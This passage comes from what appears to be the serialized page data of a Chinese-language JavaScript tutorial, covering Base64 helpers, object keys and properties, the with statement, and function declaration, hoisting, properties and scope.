b64Encode(str) {\n  return btoa(encodeURIComponent(str));\n}\n\nfunction b64Decode(str) {\n  return decodeURIComponent(atob(str));\n}\n\nb64Encode(&#039;你好&#039;) // &quot;JUU0JUJEJUEwJUU1JUE1JUJE&quot;\nb64Decode(&#039;JUU0JUJEJUEwJUU1JUE1JUJE&#039;) // &quot;你好&quot;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-encoding\">JavaScript’s internal character encoding: UCS-2 or UTF-16?</a></li>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-unicode\">JavaScript has a Unicode problem</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa\">Window.btoa</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"对象","link":"/types/object.html"}],"content":"\n        <h1>\n            <a href='#对象' class='header-anchor'>#</a>\n            <span>对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#生成方法' class='header-anchor'>#</a>\n            <span>生成方法</span>\n        </h3>\n    <p>对象（object）是 JavaScript 语言的核心概念，也是最重要的数据类型。</p>\n<p>什么是对象？简单说，对象就是一组“键值对”（key-value）的集合，是一种无序的复合数据集合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: &#039;Hello&#039;,\n  bar: &#039;World&#039;\n};</code></pre><p>上面代码中，大括号就定义了一个对象，它被赋值给变量<code>obj</code>，所以变量<code>obj</code>就指向一个对象。该对象内部包含两个键值对（又称为两个“成员”），第一个键值对是<code>foo: &#39;Hello&#39;</code>，其中<code>foo</code>是“键名”（成员的名称），字符串<code>Hello</code>是“键值”（成员的值）。键名与键值之间用冒号分隔。第二个键值对是<code>bar: &#39;World&#39;</code>，<code>bar</code>是键名，<code>World</code>是键值。两个键值对之间用逗号分隔。</p>\n\n        <h3>\n            <a href='#键名' class='header-anchor'>#</a>\n            <span>键名</span>\n        </h3>\n    <p>对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以。上面的代码也可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  &#039;foo&#039;: &#039;Hello&#039;,\n  &#039;bar&#039;: &#039;World&#039;\n};</code></pre><p>如果键名是数值，会被自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  1: &#039;a&#039;,\n  3.2: &#039;b&#039;,\n  1e2: true,\n  1e-2: true,\n  .234: true,\n  0xFF: true\n};\n\nobj\n// Object {\n//   1: &quot;a&quot;,\n//   3.2: &quot;b&quot;,\n//   100: true,\n//   0.01: true,\n//   0.234: true,\n//   255: true\n// }\n\nobj[&#039;100&#039;] // true</code></pre><p>上面代码中，对象<code>obj</code>的所有键名虽然看上去像数值，实际上都被自动转成了字符串。</p>\n<p>如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\nvar obj = {\n  1p: &#039;Hello World&#039;\n};\n\n// 不报错\nvar obj = {\n  &#039;1p&#039;: &#039;Hello World&#039;,\n  &#039;h w&#039;: &#039;Hello World&#039;,\n  &#039;p+q&#039;: &#039;Hello World&#039;\n};</code></pre><p>上面对象的三个键名，都不符合标识名的条件，所以必须加上引号。</p>\n<p>对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: function (x) {\n    return 2 * x;\n  }\n};\n\nobj.p(1) // 2</code></pre><p>上面代码中，对象<code>obj</code>的属性<code>p</code>，就指向一个函数。</p>\n<p>如果属性的值还是一个对象，就形成了链式引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = { bar: &#039;hello&#039; };\n\no1.foo = o2;\no1.foo.bar // &quot;hello&quot;</code></pre><p>上面代码中，对象<code>o1</code>的属性<code>foo</code>指向对象<code>o2</code>，就可以链式引用<code>o2</code>的属性。</p>\n<p>对象的属性之间用逗号分隔，最后一个属性后面可以加逗号（trailing comma），也可以不加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123,\n  m: function () { ... },\n}</code></pre><p>上面的代码中，<code>m</code>属性后面的那个逗号，有没有都可以。</p>\n<p>属性可以动态创建，不必在对象声明时就指定。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.foo = 123;\nobj.foo // 123</code></pre><p>上面代码中，直接对<code>obj</code>对象的<code>foo</code>属性赋值，结果就在运行时创建了<code>foo</code>属性。</p>\n\n        <h3>\n            <a href='#对象的引用' class='header-anchor'>#</a>\n            <span>对象的引用</span>\n        </h3>\n    <p>如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1.a = 1;\no2.a // 1\n\no2.b = 2;\no1.b // 2</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，因此为其中任何一个变量添加属性，另一个变量都可以读写该属性。</p>\n<p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1 = 1;\no2 // {}</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，然后<code>o1</code>的值变为1，这时不会对<code>o2</code>产生影响，<code>o2</code>还是指向原来的那个对象。</p>\n<p>但是，这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = x;\n\nx = 2;\ny // 1</code></pre><p>上面的代码中，当<code>x</code>的值发生变化后，<code>y</code>的值并不变，这就表示<code>y</code>和<code>x</code>并不是指向同一个内存地址。</p>\n\n        <h3>\n            <a href='#表达式还是语句？' class='header-anchor'>#</a>\n            <span>表达式还是语句？</span>\n        </h3>\n    <p>对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？</p>\n<pre class=\"prettyprint language-javascript\"><code>{ foo: 123 }</code></pre><p>JavaScript 引擎读到上面这行代码，会发现可能有两种含义。第一种可能是，这是一个表达式，表示一个包含<code>foo</code>属性的对象；第二种可能是，这是一个语句，表示一个代码区块，里面有一个标签<code>foo</code>，指向表达式<code>123</code>。</p>\n<p>为了避免这种歧义，V8 引擎规定，如果行首是大括号，一律解释为对象。不过，为了避免歧义，最好在大括号前加上圆括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>({ foo: 123})</code></pre><p>这种差异在<code>eval</code>语句（作用是对字符串求值）中反映得最明显。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;{foo: 123}&#039;) // 123\neval(&#039;({foo: 123})&#039;) // {foo: 123}</code></pre><p>上面代码中，如果没有圆括号，<code>eval</code>将其理解为一个代码块；加上圆括号以后，就理解成一个对象。</p>\n\n        <h2>\n            <a href='#属性的操作' class='header-anchor'>#</a>\n            <span>属性的操作</span>\n        </h2>\n    \n        <h3>\n            <a href='#属性的读取' class='header-anchor'>#</a>\n            <span>属性的读取</span>\n        </h3>\n    <p>读取对象的属性，有两种方法，一种是使用点运算符，还有一种是使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;Hello World&#039;\n};\n\nobj.p // &quot;Hello World&quot;\nobj[&#039;p&#039;] // &quot;Hello World&quot;</code></pre><p>上面代码分别采用点运算符和方括号运算符，读取属性<code>p</code>。</p>\n<p>请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = &#039;bar&#039;;\n\nvar obj = {\n  foo: 1,\n  bar: 2\n};\n\nobj.foo  // 1\nobj[foo]  // 2</code></pre><p>上面代码中，引用对象<code>obj</code>的<code>foo</code>属性时，如果使用点运算符，<code>foo</code>就是字符串；如果使用方括号运算符，但是不使用引号，那么<code>foo</code>就是一个变量，指向字符串<code>bar</code>。</p>\n<p>方括号运算符内部还可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>obj[&#039;hello&#039; + &#039; world&#039;]\nobj[3 + 3]</code></pre><p>数字键可以不加引号，因为会自动转成字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0.7: &#039;Hello World&#039;\n};\n\nobj[&#039;0.7&#039;] // &quot;Hello World&quot;\nobj[0.7] // &quot;Hello World&quot;</code></pre><p>上面代码中，对象<code>obj</code>的数字键<code>0.7</code>，加不加引号都可以，因为会被自动转为字符串。</p>\n<p>注意，数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  123: &#039;hello world&#039;\n};\n\nobj.123 // 报错\nobj[123] // &quot;hello world&quot;</code></pre><p>上面代码的第一个表达式，对数值键名<code>123</code>使用点运算符，结果报错。第二个表达式使用方括号运算符，结果就是正确的。</p>\n\n        <h3>\n            <a href='#属性的赋值' class='header-anchor'>#</a>\n            <span>属性的赋值</span>\n        </h3>\n    <p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nobj.foo = &#039;Hello&#039;;\nobj[&#039;bar&#039;] = &#039;World&#039;;</code></pre><p>上面代码中，分别使用点运算符和方括号运算符，对属性赋值。</p>\n<p>JavaScript 允许属性的“后绑定”，也就是说，你可以在任意时刻新增属性，没必要在定义对象的时候，就定义好属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\n// 等价于\n\nvar obj = {};\nobj.p = 1;</code></pre>\n        <h3>\n            <a href='#属性的查看' class='header-anchor'>#</a>\n            <span>属性的查看</span>\n        </h3>\n    <p>查看一个对象本身的所有属性，可以使用<code>Object.keys</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  key1: 1,\n  key2: 2\n};\n\nObject.keys(obj);\n// [&#039;key1&#039;, &#039;key2&#039;]</code></pre>\n        <h3>\n            <a href='#属性的删除：delete-命令' class='header-anchor'>#</a>\n            <span>属性的删除：delete 命令</span>\n        </h3>\n    <p><code>delete</code>命令用于删除对象的属性，删除成功后返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nObject.keys(obj) // [&quot;p&quot;]\n\ndelete obj.p // true\nobj.p // undefined\nObject.keys(obj) // []</code></pre><p>上面代码中，<code>delete</code>命令删除对象<code>obj</code>的<code>p</code>属性。删除后，再读取<code>p</code>属性就会返回<code>undefined</code>，而且<code>Object.keys</code>方法的返回值也不再包括该属性。</p>\n<p>注意，删除一个不存在的属性，<code>delete</code>不报错，而且返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.p // true</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p</code>属性，但是<code>delete</code>命令照样返回<code>true</code>。因此，不能根据<code>delete</code>命令的结果，认定某个属性是存在的。</p>\n<p>只有一种情况，<code>delete</code>命令会返回<code>false</code>，那就是该属性存在，且不得删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  configurable: false\n});\n\nobj.p // 123\ndelete obj.p // false</code></pre><p>上面代码之中，对象<code>obj</code>的<code>p</code>属性是不能删除的，所以<code>delete</code>命令返回<code>false</code>（关于<code>Object.defineProperty</code>方法的介绍，请看《标准库》的 Object 对象一章）。</p>\n<p>另外，需要注意的是，<code>delete</code>命令只能删除对象本身的属性，无法删除继承的属性（关于继承参见《面向对象编程》章节）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.toString // true\nobj.toString // function toString() { [native code] }</code></pre><p>上面代码中，<code>toString</code>是对象<code>obj</code>继承的属性，虽然<code>delete</code>命令返回<code>true</code>，但该属性并没有被删除，依然存在。这个例子还说明，即使<code>delete</code>返回<code>true</code>，该属性依然可能读取到值。</p>\n\n        <h3>\n            <a href='#属性是否存在：in-运算符' class='header-anchor'>#</a>\n            <span>属性是否存在：in 运算符</span>\n        </h3>\n    <p><code>in</code>运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回<code>true</code>，否则返回<code>false</code>。它的左边是一个字符串，表示属性名，右边是一个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n&#039;p&#039; in obj // true\n&#039;toString&#039; in obj // true</code></pre><p><code>in</code>运算符的一个问题是，它不能识别哪些属性是对象自身的，哪些属性是继承的。就像上面代码中，对象<code>obj</code>本身并没有<code>toString</code>属性，但是<code>in</code>运算符会返回<code>true</code>，因为这个属性是继承的。</p>\n<p>这时，可以使用对象的<code>hasOwnProperty</code>方法判断一下，是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nif (&#039;toString&#039; in obj) {\n  console.log(obj.hasOwnProperty(&#039;toString&#039;)) // false\n}</code></pre>\n        <h3>\n            <a href='#属性的遍历：for...in-循环' class='header-anchor'>#</a>\n            <span>属性的遍历：for...in 循环</span>\n        </h3>\n    <p><code>for...in</code>循环用来遍历一个对象的全部属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {a: 1, b: 2, c: 3};\n\nfor (var i in obj) {\n  console.log(&#039;键名：&#039;, i);\n  console.log(&#039;键值：&#039;, obj[i]);\n}\n// 键名： a\n// 键值： 1\n// 键名： b\n// 键值： 2\n// 键名： c\n// 键值： 3</code></pre><p><code>for...in</code>循环有两个使用注意点。</p>\n<ul>\n<li>它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性。</li>\n<li>它不仅遍历对象自身的属性，还遍历继承的属性。</li>\n</ul>\n<p>举例来说，对象都继承了<code>toString</code>属性，但是<code>for...in</code>循环不会遍历到这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\n// toString 属性是存在的\nobj.toString // toString() { [native code] }\n\nfor (var p in obj) {\n  console.log(p);\n} // 没有任何输出</code></pre><p>上面代码中，对象<code>obj</code>继承了<code>toString</code>属性，该属性不会被<code>for...in</code>循环遍历到，因为它默认是“不可遍历”的。关于对象属性的可遍历性，参见《标准库》章节中 Object 一章的介绍。</p>\n<p>如果继承的属性是可遍历的，那么就会被<code>for...in</code>循环遍历到。但是，一般情况下，都是只想遍历对象自身的属性，所以使用<code>for...in</code>的时候，应该结合使用<code>hasOwnProperty</code>方法，在循环内部判断一下，某个属性是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = { name: &#039;老张&#039; };\n\nfor (var key in person) {\n  if (person.hasOwnProperty(key)) {\n    console.log(key);\n  }\n}\n// name</code></pre>\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>语句的格式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>with (对象) {\n  语句;\n}</code></pre><p>它的作用是操作同一个对象的多个属性时，提供一些书写的方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 例一\nvar obj = {\n  p1: 1,\n  p2: 2,\n};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n// 等同于\nobj.p1 = 4;\nobj.p2 = 5;\n\n// 例二\nwith (document.links[0]){\n  console.log(href);\n  console.log(title);\n  console.log(style);\n}\n// 等同于\nconsole.log(document.links[0].href);\nconsole.log(document.links[0].title);\nconsole.log(document.links[0].style);</code></pre><p>注意，如果<code>with</code>区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n\nobj.p1 // undefined\np1 // 4</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p1</code>属性，对<code>p1</code>赋值等于创造了一个全局变量<code>p1</code>。正确的写法应该是，先定义对象<code>obj</code>的属性<code>p1</code>，然后在<code>with</code>区块内操作它。</p>\n<p>这是因为<code>with</code>区块没有改变作用域，它的内部依然是当前作用域。这造成了<code>with</code>语句的一个很大的弊病，就是绑定对象不明确。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (obj) {\n  console.log(x);\n}</code></pre><p>单纯从上面的代码块，根本无法判断<code>x</code>到底是全局变量，还是对象<code>obj</code>的一个属性。这非常不利于代码的除错和模块化，编译器也无法对这段代码进行优化，只能留到运行时判断，这就拖慢了运行速度。因此，建议不要使用<code>with</code>语句，可以考虑用一个临时变量代替<code>with</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>with(obj1.obj2.obj3) {\n  console.log(p1 + p2);\n}\n\n// 可以写成\nvar temp = obj1.obj2.obj3;\nconsole.log(temp.p1 + temp.p2);</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer，<a href=\"http://www.2ality.com/2012/10/javascript-properties.html\">Object properties in JavaScript</a></li>\n<li>Lakshan Perera, <a href=\"http://www.laktek.com/2012/12/29/revisiting-javascript-objects/\">Revisiting JavaScript Objects</a></li>\n<li>Angus Croll, <a href=\"http://javascriptweblog.wordpress.com/2010/09/27/the-secret-life-of-javascript-primitives/\">The Secret Life of JavaScript Primitives</a>i</li>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/06/with-statement.html\">JavaScript’s with statement and why it’s deprecated</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"函数","link":"/types/function.html"}],"content":"\n        <h1>\n            <a href='#函数' class='header-anchor'>#</a>\n            <span>函数</span>\n        </h1>\n    <p>函数是一段可以反复调用的代码块。函数还能接受输入的参数，不同的参数会返回不同的值。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#函数的声明' class='header-anchor'>#</a>\n            <span>函数的声明</span>\n        </h3>\n    <p>JavaScript 有三种声明函数的方法。</p>\n<p><strong>（1）function 命令</strong></p>\n<p><code>function</code>命令声明的代码区块，就是一个函数。<code>function</code>命令后面是函数名，函数名后面是一对圆括号，里面是传入函数的参数。函数体放在大括号里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(s) {\n  console.log(s);\n}</code></pre><p>上面的代码命名了一个<code>print</code>函数，以后使用<code>print()</code>这种形式，就可以调用相应的代码。这叫做函数的声明（Function Declaration）。</p>\n<p><strong>（2）函数表达式</strong></p>\n<p>除了用<code>function</code>命令声明函数，还可以采用变量赋值的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function(s) {\n  console.log(s);\n};</code></pre><p>这种写法将一个匿名函数赋值给变量。这时，这个匿名函数又称函数表达式（Function Expression），因为赋值语句的等号右侧只能放表达式。</p>\n<p>采用函数表达式声明函数时，<code>function</code>命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function x(){\n  console.log(typeof x);\n};\n\nx\n// ReferenceError: x is not defined\n\nprint()\n// function</code></pre><p>上面代码在函数表达式中，加入了函数名<code>x</code>。这个<code>x</code>只在函数体内部可用，指代函数表达式本身，其他地方都不可用。这种写法的用处有两个，一是可以在函数体内部调用自身，二是方便除错（除错工具显示函数调用栈时，将显示函数名，而不再显示这里是一个匿名函数）。因此，下面的形式声明函数也非常常见。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {};</code></pre><p>需要注意的是，函数的表达式需要在语句的结尾加上分号，表示语句结束。而函数的声明在结尾的大括号后面不用加分号。总的来说，这两种声明函数的方式，差别很细微，可以近似认为是等价的。</p>\n<p><strong>（3）Function 构造函数</strong></p>\n<p>第三种声明函数的方式是<code>Function</code>构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var add = new Function(\n  &#039;x&#039;,\n  &#039;y&#039;,\n  &#039;return x + y&#039;\n);\n\n// 等同于\nfunction add(x, y) {\n  return x + y;\n}</code></pre><p>上面代码中，<code>Function</code>构造函数接受三个参数，除了最后一个参数是<code>add</code>函数的“函数体”，其他参数都是<code>add</code>函数的参数。</p>\n<p>你可以传递任意数量的参数给<code>Function</code>构造函数，只有最后一个参数会被当做函数体，如果只有一个参数，该参数就是函数体。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = new Function(\n  &#039;return &quot;hello world&quot;&#039;\n);\n\n// 等同于\nfunction foo() {\n  return &#039;hello world&#039;;\n}</code></pre><p><code>Function</code>构造函数可以不使用<code>new</code>命令，返回结果完全一样。</p>\n<p>总的来说，这种声明函数的方式非常不直观，几乎无人使用。</p>\n\n        <h3>\n            <a href='#函数的重复声明' class='header-anchor'>#</a>\n            <span>函数的重复声明</span>\n        </h3>\n    <p>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(1);\n}\nf() // 2\n\nfunction f() {\n  console.log(2);\n}\nf() // 2</code></pre><p>上面代码中，后一次的函数声明覆盖了前面一次。而且，由于函数名的提升（参见下文），前一次声明在任何时候都是无效的，这一点要特别注意。</p>\n\n        <h3>\n            <a href='#圆括号运算符，return-语句和递归' class='header-anchor'>#</a>\n            <span>圆括号运算符，return 语句和递归</span>\n        </h3>\n    <p>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\nadd(1, 1) // 2</code></pre><p>上面代码中，函数名后面紧跟一对圆括号，就会调用这个函数。</p>\n<p>函数体内部的<code>return</code>语句，表示返回。JavaScript 引擎遇到<code>return</code>语句，就直接返回<code>return</code>后面的那个表达式的值，后面即使还有语句，也不会得到执行。也就是说，<code>return</code>语句所带的那个表达式，就是函数的返回值。<code>return</code>语句不是必需的，如果没有的话，该函数就不返回任何值，或者说返回<code>undefined</code>。</p>\n<p>函数可以调用自身，这就是递归（recursion）。下面就是通过递归，计算斐波那契数列的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function fib(num) {\n  if (num === 0) return 0;\n  if (num === 1) return 1;\n  return fib(num - 2) + fib(num - 1);\n}\n\nfib(6) // 8</code></pre><p>上面代码中，<code>fib</code>函数内部又调用了<code>fib</code>，计算得到斐波那契数列的第6个元素是8。</p>\n\n        <h3>\n            <a href='#第一等公民' class='header-anchor'>#</a>\n            <span>第一等公民</span>\n        </h3>\n    <p>JavaScript 语言将函数看作一种值，与其它值（数值、字符串、布尔值等等）地位相同。凡是可以使用值的地方，就能使用函数。比如，可以把函数赋值给变量和对象的属性，也可以当作参数传入其他函数，或者作为函数的结果返回。函数只是一个可以执行的值，此外并无特殊之处。</p>\n<p>由于函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\n// 将函数赋值给一个变量\nvar operator = add;\n\n// 将函数作为参数和返回值\nfunction a(op){\n  return op;\n}\na(add)(1, 1)\n// 2</code></pre>\n        <h3>\n            <a href='#函数名的提升' class='header-anchor'>#</a>\n            <span>函数名的提升</span>\n        </h3>\n    <p>JavaScript 引擎将函数名视同变量名，所以采用<code>function</code>命令声明函数时，整个函数会像变量声明一样，被提升到代码头部。所以，下面的代码不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\n\nfunction f() {}</code></pre><p>表面上，上面代码好像在声明之前就调用了函数<code>f</code>。但是实际上，由于“变量提升”，函数<code>f</code>被提升到了代码头部，也就是在调用之前已经声明了。但是，如果采用赋值语句定义函数，JavaScript 就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\nvar f = function (){};\n// TypeError: undefined is not a function</code></pre><p>上面的代码等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f;\nf();\nf = function () {};</code></pre><p>上面代码第二行，调用<code>f</code>的时候，<code>f</code>只是被声明了，还没有被赋值，等于<code>undefined</code>，所以会报错。因此，如果同时采用<code>function</code>命令和赋值语句声明同一个函数，最后总是采用赋值语句的定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(&#039;1&#039;);\n}\n\nfunction f() {\n  console.log(&#039;2&#039;);\n}\n\nf() // 1</code></pre>\n        <h2>\n            <a href='#函数的属性和方法' class='header-anchor'>#</a>\n            <span>函数的属性和方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#name-属性' class='header-anchor'>#</a>\n            <span>name 属性</span>\n        </h3>\n    <p>函数的<code>name</code>属性返回函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {}\nf1.name // &quot;f1&quot;</code></pre><p>如果是通过变量赋值定义的函数，那么<code>name</code>属性返回变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f2 = function () {};\nf2.name // &quot;f2&quot;</code></pre><p>但是，上面这种情况，只有在变量的值是一个匿名函数时才是如此。如果变量的值是一个具名函数，那么<code>name</code>属性返回<code>function</code>关键字之后的那个函数名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f3 = function myName() {};\nf3.name // &#039;myName&#039;</code></pre><p>上面代码中，<code>f3.name</code>返回函数表达式的名字。注意，真正的函数名还是<code>f3</code>，而<code>myName</code>这个名字只在函数体内部可用。</p>\n<p><code>name</code>属性的一个用处，就是获取参数函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myFunc = function () {};\n\nfunction test(f) {\n  console.log(f.name);\n}\n\ntest(myFunc) // myFunc</code></pre><p>上面代码中，函数<code>test</code>内部通过<code>name</code>属性，就可以知道传入的参数是什么函数。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p>函数的<code>length</code>属性返回函数预期传入的参数个数，即函数定义之中的参数个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {}\nf.length // 2</code></pre><p>上面代码定义了空函数<code>f</code>，它的<code>length</code>属性就是定义时的参数个数。不管调用时输入了多少个参数，<code>length</code>属性始终等于2。</p>\n<p><code>length</code>属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的”方法重载“（overload）。</p>\n\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p>函数的<code>toString</code>方法返回一个字符串，内容是函数的源码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  a();\n  b();\n  c();\n}\n\nf.toString()\n// function f() {\n//  a();\n//  b();\n//  c();\n// }</code></pre><p>函数内部的注释也可以返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {/*\n  这是一个\n  多行注释\n*/}\n\nf.toString()\n// &quot;function f(){/*\n//   这是一个\n//   多行注释\n// */}&quot;</code></pre><p>利用这一点，可以变相实现多行字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var multiline = function (fn) {\n  var arr = fn.toString().split(&#039;\\n&#039;);\n  return arr.slice(1, arr.length - 1).join(&#039;\\n&#039;);\n};\n\nfunction f() {/*\n  这是一个\n  多行注释\n*/}\n\nmultiline(f);\n// &quot; 这是一个\n//   多行注释&quot;</code></pre>\n        <h2>\n            <a href='#函数作用域' class='header-anchor'>#</a>\n            <span>函数作用域</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>作用域（scope）指的是变量存在的范围。在 ES5 的规范中，Javascript 只有两种作用域：一种是全局作用域，变量在整个程序中一直存在，所有地方都可以读取；另一种是函数作用域，变量只在函数内部存在。ES6 又新增了块级作用域，本教程不涉及。</p>\n<p>函数外部声明的变量就是全局变量（global variable），它可以在函数内部读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f() {\n  console.log(v);\n}\n\nf()\n// 1</code></pre><p>上面的代码表明，函数<code>f</code>内部可以读取全局变量<code>v</code>。</p>\n<p>在函数内部定义的变量，外部无法读取，称为“局部变量”（local variable）。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(){\n  var v = 1;\n}\n\nv // ReferenceError: v is not defined</code></pre><p>上面代码中，变量<code>v</code>在函数内部定义，所以是一个局部变量，函数之外就无法读取。</p>\n<p>函数内部定义的变量，会在该作用域内覆盖同名全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f(){\n  var v = 2;\n  console.log(v);\n}\n\nf() // 2\nv // 1</code></pre><p>上面代码中，变量<code>v</code>同时在函数的外部和内部有定义。结果，在函数内部定义，局部变量<code>v</code>覆盖了全局变量<code>v</code>。</p>\n<p>注意，对于<code>var</code>命令来说，局部变量只能在函数内部声明，在其他区块中声明，一律都是全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n  var x = 5;\n}\nconsole.log(x);  // 5</code></pre><p>上面代码中，变量<code>x</code>在条件判断区块之中声明，结果就是一个全局变量，可以在区块之外读取。</p>\n\n        <h3>\n            <a href='#函数内部的变量提升' class='header-anchor'>#</a>\n            <span>函数内部的变量提升</span>\n        </h3>\n    